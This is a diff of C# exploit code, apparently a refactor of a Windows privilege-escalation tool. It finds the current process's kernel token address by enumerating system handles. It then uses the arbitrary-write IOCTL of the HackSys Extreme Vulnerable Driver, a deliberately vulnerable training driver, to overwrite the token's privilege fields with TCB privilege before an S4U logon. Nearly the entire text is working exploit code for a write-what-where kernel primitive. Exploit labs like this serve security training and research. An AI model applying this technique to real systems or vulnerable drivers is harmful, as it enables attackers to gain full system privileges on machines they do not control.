@@ -1017,126 +1017,56 @@ namespace TcbS4uAssignTokenVariant
 
         static IntPtr GetCurrentProcessTokenPointer()
         {
-            int error;
             int ntstatus;
+            IntPtr pInfoBuffer;
+            int nInfoLength = 1024;
+            IntPtr hToken = WindowsIdentity.GetCurrent().Token;
             var pObject = IntPtr.Zero;
-
-            if (!OpenProcessToken(
-                Process.GetCurrentProcess().Handle,
-                TokenAccessFlags.MAXIMUM_ALLOWED,
-                out IntPtr hToken))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to open current process token.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return IntPtr.Zero;
-            }
-
-            Console.WriteLine("[+] Got a handle of current process token.");
-            Console.WriteLine("    |-> hToken: 0x{0}", hToken.ToString("X"));
-            Console.WriteLine("[>] Trying to retrieve system information.");
-
-            int systemInformationLength = 1024;
-            IntPtr infoBuffer;
 
             do
             {
-                infoBuffer = Marshal.AllocHGlobal(systemInformationLength);
-
+                pInfoBuffer = Marshal.AllocHGlobal(nInfoLength);
                 ntstatus = NtQuerySystemInformation(
                     SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
-                    infoBuffer,
-                    systemInformationLength,
-                    ref systemInformationLength);
+                    pInfoBuffer,
+                    nInfoLength,
+                    ref nInfoLength);
 
                 if (ntstatus != STATUS_SUCCESS)
-                    Marshal.FreeHGlobal(infoBuffer);
+                    Marshal.FreeHGlobal(pInfoBuffer);
             } while (ntstatus == STATUS_INFO_LENGTH_MISMATCH);
 
-            CloseHandle(hToken);
-
-            if (ntstatus != STATUS_SUCCESS)
+            if (ntstatus == STATUS_SUCCESS)
             {
-                Console.WriteLine("[-] Failed to get system information.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
+                var nEntryCount = Marshal.ReadInt32(pInfoBuffer);
+                var pid = Process.GetCurrentProcess().Id;
+                var nEntrySize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
 
-                return IntPtr.Zero;
-            }
-
-            var entryCount = Marshal.ReadInt32(infoBuffer);
-            Console.WriteLine("[+] Got {0} entries.", entryCount);
-
-            var pid = Process.GetCurrentProcess().Id;
-            var entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
-            var entrySize = Marshal.SizeOf(entry);
-            var pEntryOffset = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
-            IntPtr uniqueProcessId;
-            IntPtr handleValue;
-
-            Console.WriteLine("[>] Searching our process entry (PID = {0}).", pid);
-
-            for (var idx = 0; idx < entryCount; idx++)
-            {
-                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
-                    pEntryOffset,
-                    entry.GetType());
-                uniqueProcessId = entry.UniqueProcessId;
-                handleValue = entry.HandleValue;
-
-                if (uniqueProcessId == new IntPtr(pid) && handleValue == hToken)
+                for (var idx = 0; idx < nEntryCount; idx++)
                 {
-                    pObject = entry.Object;
-                    Console.WriteLine("[+] Got our entry.");
-                    Console.WriteLine("    |-> Object: 0x{0}", pObject.ToString("X16"));
-                    Console.WriteLine("    |-> UniqueProcessId: {0}", uniqueProcessId);
-                    Console.WriteLine("    |-> HandleValue: 0x{0}", handleValue.ToString("X"));
+                    IntPtr pEntryBuffer;
 
-                    break;
+                    if (Environment.Is64BitProcess)
+                        pEntryBuffer = new IntPtr(pInfoBuffer.ToInt64() + (IntPtr.Size * 2) + (nEntrySize * idx));
+                    else
+                        pEntryBuffer = new IntPtr(pInfoBuffer.ToInt32() + (IntPtr.Size * 2) + (nEntrySize * idx));
+
+                    var entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
+                        pEntryBuffer,
+                        typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
+
+                    if ((entry.UniqueProcessId == new IntPtr(pid)) &&
+                        (entry.HandleValue == hToken))
+                    {
+                        pObject = entry.Object;
+                        break;
+                    }
                 }
 
-                pEntryOffset = new IntPtr(pEntryOffset.ToInt64() + entrySize);
+                Marshal.FreeHGlobal(pInfoBuffer);
             }
-
-            if (pObject == IntPtr.Zero)
-                Console.WriteLine("[-] Failed to get target entry.\n");
-
-            Marshal.FreeHGlobal(infoBuffer);
-            CloseHandle(hToken);
 
             return pObject;
-        }
-
-
-        static IntPtr GetDeviceHandle(string deviceName)
-        {
-            int error;
-
-            Console.WriteLine("[>] Trying to open device driver.");
-            Console.WriteLine("    |-> Device Path : {0}", deviceName);
-
-            IntPtr hDevice = CreateFile(
-                deviceName,
-                FileAccess.ReadWrite,
-                FileShare.ReadWrite,
-                IntPtr.Zero,
-                FileMode.Open,
-                FileAttributes.Normal,
-                IntPtr.Zero);
-
-            if (hDevice == INVALID_HANDLE_VALUE)
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get device handle.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-
-                return IntPtr.Zero;
-            }
-
-            Console.WriteLine("[+] Got a device handle.");
-            Console.WriteLine("    |-> hDevice: 0x{0}", hDevice.ToString("X"));
-
-            return hDevice;
         }
 
 
@@ -1211,37 +1141,42 @@ namespace TcbS4uAssignTokenVariant
         }
 
 
-        static void OverwriteTokenPrivileges(
-            IntPtr hDevice,
-            IntPtr tokenPointer,
-            ulong privValue)
+        static bool OverwriteTokenPrivileges(IntPtr hDevice, IntPtr tokenPointer, ulong privValue)
         {
             IntPtr pParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
             IntPtr pEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);
+            bool status = WritePointer(hDevice, pParent, new IntPtr((long)privValue));
 
-            Console.WriteLine("[>] Trying to overwrite token.");
+            if (status)
+                status = WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
 
-            WritePointer(hDevice, pParent, new IntPtr((long)privValue));
-            WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
+            return status;
         }
 
 
-        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
+        static bool WritePointer(IntPtr hDevice, IntPtr pWhere, IntPtr pWhatToWrite)
         {
-            uint ioctl = 0x22200B;
-            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
-            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
-            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
-            IntPtr[] inputArray = new IntPtr[2];
-            inputArray[0] = whatBuffer; // what
-            inputArray[1] = where; // where
-            Marshal.Copy(inputArray, 0, inputBuffer, 2);
+            bool status;
+            IntPtr pInputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
+            IntPtr pWhatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(pWhatBuffer, pWhatToWrite);
+            Marshal.WriteIntPtr(pInputBuffer, pWhatBuffer); // what
+            Marshal.WriteIntPtr(pInputBuffer, IntPtr.Size, pWhere); // where
 
-            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
-                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
+            status = DeviceIoControl(
+                hDevice,
+                0x22200B,
+                pInputBuffer,
+                (IntPtr.Size * 2),
+                IntPtr.Zero,
+                0,
+                IntPtr.Zero,
+                IntPtr.Zero);
 
-            Marshal.FreeHGlobal(whatBuffer);
-            Marshal.FreeHGlobal(inputBuffer);
+            Marshal.FreeHGlobal(pWhatBuffer);
+            Marshal.FreeHGlobal(pInputBuffer);
+
+            return status;
         }
 
 
@@ -1262,12 +1197,18 @@ namespace TcbS4uAssignTokenVariant
                 return;
             }
 
-            IntPtr tokenPointer = GetCurrentProcessTokenPointer();
+            Console.WriteLine("[>] Trying to find token address for this process.");
 
-            if (tokenPointer == IntPtr.Zero)
+            IntPtr pTokenPointer = GetCurrentProcessTokenPointer();
+
+            if (pTokenPointer == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                 return;
+            }
+            else
+            {
+                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pTokenPointer.ToString("X16"));
             }
 
             do
@@ -1276,16 +1217,45 @@ namespace TcbS4uAssignTokenVariant
                 IntPtr hS4uImpersonateToken;
                 IntPtr hS4uPrimaryToken;
                 string deviceName = @"\\.\HacksysExtremeVulnerableDriver";
-                IntPtr hDevice = GetDeviceHandle(deviceName);
 
-                if (hDevice == IntPtr.Zero)
+                Console.WriteLine("[>] Trying to open device driver.");
+                Console.WriteLine("    [*] Device Path : {0}", deviceName);
+
+                IntPtr hDevice = CreateFile(
+                    deviceName,
+                    FileAccess.ReadWrite,
+                    FileShare.ReadWrite,
+                    IntPtr.Zero,
+                    FileMode.Open,
+                    FileAttributes.Normal,
+                    IntPtr.Zero);
+
+                if (hDevice == INVALID_HANDLE_VALUE)
                 {
                     Console.WriteLine("[-] Failed to open {0}", deviceName);
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                     break;
                 }
+                else
+                {
+                    Console.WriteLine("[+] Got driver handle (Handle = 0x{0}).", hDevice.ToString("X"));
+                }
 
-                OverwriteTokenPrivileges(hDevice, tokenPointer, (ulong)SepTokenPrivilegesFlags.TCB);
+                Console.WriteLine("[>] Trying to overwrite token.");
+
+                status = OverwriteTokenPrivileges(hDevice, pTokenPointer, (ulong)SepTokenPrivilegesFlags.TCB);
                 CloseHandle(hDevice);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to overwrite token privileges.");
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Token privileges are overwritten successfully.");
+                }
 
                 Console.WriteLine("[>] Trying to S4U logon.");
 
